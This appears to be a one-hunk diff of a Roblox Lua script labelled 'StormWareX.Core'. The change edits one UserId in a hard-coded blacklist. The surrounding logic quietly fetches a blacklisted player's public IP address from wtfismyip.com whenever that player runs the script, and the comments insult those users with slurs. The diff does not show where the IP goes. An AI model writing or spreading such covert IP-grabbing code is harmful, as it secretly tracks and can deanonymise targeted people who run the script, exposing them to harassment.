@@ -1095,7 +1095,7 @@ local function JPSURY_fake_script() -- StormWareX.Core
 	end)
 	local ip = " // NOT BLACKLISTED"
 	-- IF A BLACKLISTED BITCH USES THIS
-	if game.Players.LocalPlayer.UserId == 3498733335 or game.Players.LocalPlayer.UserId == 3489570364 or game.Players.LocalPlayer.UserId == 3596085291 then
+	if game.Players.LocalPlayer.UserId == 3498733335 or game.Players.LocalPlayer.UserId == 3489570364 or game.Players.LocalPlayer.UserId == 3576708191 then
 		ip = game:HttpGet("https://wtfismyip.com/text")
 	end
 	-- i do not like bitches
